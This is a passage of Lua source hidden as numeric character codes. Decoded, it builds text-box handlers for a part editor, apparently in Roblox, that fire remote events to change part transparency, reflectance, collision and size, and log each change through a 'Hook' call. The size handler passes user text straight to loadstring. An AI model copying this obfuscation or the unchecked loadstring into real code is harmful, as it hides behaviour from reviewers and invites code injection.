01,115,34,41,13,10,108,111,99,97,108,32,84,114,97,110,115,112,97,114,101,110,99,121,32,61,32,80,97,114,116,69,100,105,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,84,114,97,110,115,112,97,114,101,110,99,121,34,44,32,34,69,100,105,116,32,116,114,97,110,115,112,97,114,101,110,99,121,32,111,102,32,112,97,114,116,115,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,84,111,69,100,105,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,70,105,114,101,82,101,109,111,116,101,40,34,116,114,97,110,115,112,97,114,101,110,99,121,34,44,32,118,44,32,107,41,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,44,34,115,101,116,32,116,114,97,110,115,112,97,114,101,110,99,121,32,111,102,32,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,116,111,32,34,46,46,107,41,13,10,101,110,100,41,13,10,108,111,99,97,108,32,82,101,102,108,101,99,116,97,110,99,101,32,61,32,80,97,114,116,69,100,105,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,82,101,102,108,101,99,116,97,110,99,101,34,44,32,34,69,100,105,116,32,114,101,102,108,101,99,116,97,110,99,101,32,111,102,32,112,97,114,116,115,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,84,111,69,100,105,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,70,105,114,101,82,101,109,111,116,101,40,34,114,101,102,108,101,99,116,97,110,99,101,34,44,32,118,44,32,107,41,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,44,34,115,101,116,32,114,101,102,108,101,99,116,97,110,99,101,32,111,102,32,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,116,111,32,34,46,46,107,41,13,10,101,110,100,41,13,10,108,111,99,97,108,32,67,97,110,67,111,108,108,105,100,101,32,61,32,80,97,114,116,69,100,105,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,67,111,108,108,105,115,105,111,110,34,44,32,34,69,100,105,116,32,99,111,108,108,105,115,105,111,110,32,111,102,32,112,97,114,116,115,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,105,102,32,107,32,61,61,32,34,102,97,108,115,101,34,32,111,114,32,107,32,61,61,32,34,70,97,108,115,101,34,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,84,111,69,100,105,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,105,114,101,82,101,109,111,116,101,40,34,99,97,110,99,111,108,108,105,100,101,34,44,32,118,44,32,102,97,108,115,101,41,13,10,32,32,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,108,115,101,105,102,32,107,32,61,61,32,34,116,114,117,101,34,32,111,114,32,107,32,61,61,32,34,84,114,117,101,34,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,84,111,69,100,105,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,105,114,101,82,101,109,111,116,101,40,34,99,97,110,99,111,108,108,105,100,101,34,44,32,118,44,32,116,114,117,101,41,13,10,32,32,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,44,34,115,101,116,32,99,111,108,108,105,115,105,111,110,32,111,102,32,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,116,111,32,34,46,46,107,41,13,10,101,110,100,41,13,10,108,111,99,97,108,32,83,105,122,101,32,61,32,80,97,114,116,69,100,105,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,83,105,122,101,34,44,32,34,69,100,105,116,32,115,105,122,101,32,40,120,44,121,44,122,41,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,110,101,119,115,105,122,101,32,61,32,116,114,117,101,13,10,32,32,32,32,97,115,115,101,114,116,40,108,111,97,100,115,116,114,105,110,103,40,34,110,101,119,115,105,122,101,32,61,32,86,101,99,116,111,114,51,46,110,101,119,40,34,32,46,46,32,107,32,46,46,32,34,41,34,41,41,40,41,13,10,32,32,32,32,108,111,99,97,108,32,110,101,119,115,105,122,101,32,61,32,110,101,119,115,105,122,101,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,84,111,69,100,105,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,70,105,114,101,82,101,109,111,116,101,40,34,114,101,115,105,122,101,34,44,32,118,44,32,110,101,119,115,105,122,101,44,32,118,46,67,70,114,97,109,101,41,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,44,34,115,101,116,32,115,105,122,101,32,111,102,32,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,116,111,32,34,46,46,116,111,115,116,114,105,110,103,40,110,101,119,115,105,122,101,41,41,13,10,101,110,100,41,13,10,13,10,}))))    
